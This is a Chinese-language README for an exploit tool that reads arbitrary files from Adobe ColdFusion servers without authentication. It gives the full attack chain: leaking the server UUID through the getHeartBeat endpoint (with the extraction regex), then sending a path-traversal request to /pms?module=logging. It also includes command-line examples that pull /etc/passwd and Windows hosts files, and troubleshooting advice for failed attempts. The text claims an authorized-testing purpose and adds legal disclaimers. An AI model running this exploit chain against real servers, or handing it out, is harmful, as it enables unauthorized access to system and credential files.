# Adobe ColdFusion 文件读取漏洞利用工具 README


## 1. 工具简介
本工具用于利用 Adobe ColdFusion 服务器的特定漏洞（通过 `/CFIDE/adminapi/_servermanager/servermanager.cfc` 和 `/pms` 端点组合），实现未授权读取目标服务器上的任意文件。支持 Windows 和 Linux 两种目标操作系统，需指定目标 URL、端口（默认 8500）及待读取文件路径。


## 2. 漏洞背景
该漏洞利用了 Adobe ColdFusion 服务器的两个关键缺陷：
1. **UUID 泄露漏洞**：通过 `/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat` 端点可未授权获取服务器 UUID（唯一标识符），无需身份验证；
2. **文件读取漏洞**：通过 `/pms` 端点的 `logging` 模块，结合泄露的 UUID 作为请求头验证，可构造路径穿越（`../../../../../../../`）读取任意文件。

**注意**：此工具仅用于合法授权的渗透测试或漏洞验证，未经授权使用可能违反法律法规，使用者需自行承担法律责任。


## 3. 环境依赖
本工具基于 Python 3 开发，需安装以下第三方库：
- `requests`：用于发送 HTTP/HTTPS 请求；
- `urllib3`：处理 HTTP 连接（禁用 SSL 证书警告）；
- `argparse`：解析命令行参数（Python 标准库，无需额外安装）。

### 3.1 依赖安装命令
在终端执行以下命令安装所需库：
```bash
pip install requests urllib3
```


## 4. 工具使用说明
### 4.1 命令行参数说明
工具通过命令行参数指定目标信息和读取文件路径，参数详情如下：

| 参数短名 | 参数长名 | 是否必填 | 默认值 | 说明 |
|----------|----------|----------|--------|------|
| `-t`     | `--target` | 是       | 无     | 目标 Adobe ColdFusion 服务器的 URL（如 `http://192.168.1.100` 或 `https://cf.example.com`） |
| `-p`     | `--port`  | 否       | 8500   | 目标服务器的端口（Adobe ColdFusion 默认端口为 8500，若端口不同需手动指定） |
| `-c`     | `--command` | 是      | 无     | 待读取的文件绝对路径（Windows 示例：`C:/Windows/System32/drivers/etc/hosts`；Linux 示例：`/etc/passwd`） |


### 4.2 使用示例
#### 示例 1：读取 Linux 服务器的 `/etc/passwd` 文件
目标服务器 URL 为 `http://192.168.2.30`，端口为默认 8500：
```bash
python coldfusion_file_read.py -t http://192.168.2.30 -c /etc/passwd
```

#### 示例 2：读取 Windows 服务器的 `hosts` 文件（自定义端口 8080）
目标服务器 URL 为 `https://10.0.0.5`，端口为 8080，读取 `C:/Windows/System32/drivers/etc/hosts`：
```bash
python coldfusion_file_read.py -t https://10.0.0.5 -p 8080 -c C:/Windows/System32/drivers/etc/hosts
```


## 5. 工具执行流程
1. **获取 UUID**：工具首先访问目标服务器的 `/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat` 端点，通过正则表达式（`r"<var name='uuid'><string>(.+?)</string></var>"`）提取服务器 UUID；
2. **文件读取请求**：使用获取到的 UUID 作为 `uuid` 请求头，访问 `/pms?module=logging&file_name=../../../../../../../[目标文件路径]&number_of_lines=100` 端点，发起文件读取请求；
3. **结果验证**：若响应状态码为 200 且 `Content-Length` 大于 2（排除空响应），则输出读取到的文件内容；否则提示“读取失败”或“文件不存在”。


## 6. 常见问题与排查
### 6.1 问题 1：“[-] Error connecting to server”
- **可能原因**：
  1. 目标服务器 URL/端口错误（如端口不是 8500 且未指定 `-p`）；
  2. 目标服务器未开启（或网络不可达）；
  3. 目标服务器的 `/CFIDE/adminapi/_servermanager/servermanager.cfc` 端点已被修复或禁用；
  4. 防火墙拦截了请求（如目标服务器禁止外部访问 8500 端口）。
- **排查建议**：
  1. 验证目标 URL 和端口是否正确（可通过 `ping` 或 `telnet [IP] [端口]` 测试连通性）；
  2. 手动访问 `[目标URL]:[端口]/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat`，确认是否能获取包含 UUID 的响应。

### 6.2 问题 2：“[-] Something went wrong while reading file or the file doesn't exist”
- **可能原因**：
  1. 待读取文件路径错误（如 Windows 路径未使用 `C:/` 格式，或 Linux 路径拼写错误）；
  2. 目标文件不存在或权限不足（如普通用户无法读取 Linux 的 `/root/.bashrc`）；
  3. 目标服务器的 `/pms` 端点已被修复，或路径穿越被拦截。
- **排查建议**：
  1. 确认目标文件路径的正确性（Windows 需区分大小写，Linux 路径需完整）；
  2. 尝试读取简单的公共文件（如 Linux 的 `/etc/hosts`、Windows 的 `C:/Windows/win.ini`），排除路径或权限问题。

### 6.3 问题 3：SSL 证书警告（已自动处理）
工具通过 `urllib3.disable_warnings()` 禁用了 SSL 证书验证警告，若目标使用自签名证书，无需额外处理；若需强制验证证书，可删除代码中的 `verify=False` 参数（不推荐，可能导致请求失败）。


## 7. 免责声明
1. 本工具仅用于 **合法授权** 的网络安全测试（如渗透测试、漏洞验证），使用者必须遵守相关法律法规，不得用于未授权的攻击行为；
2. 对于因滥用本工具导致的任何非法活动、数据泄露、系统损坏等后果，工具开发者不承担任何法律责任，全部责任由使用者自行承担；
3. 使用本工具前，请确保已获得目标系统所有者的书面授权，避免违反《中华人民共和国网络安全法》《中华人民共和国刑法》等相关法律。
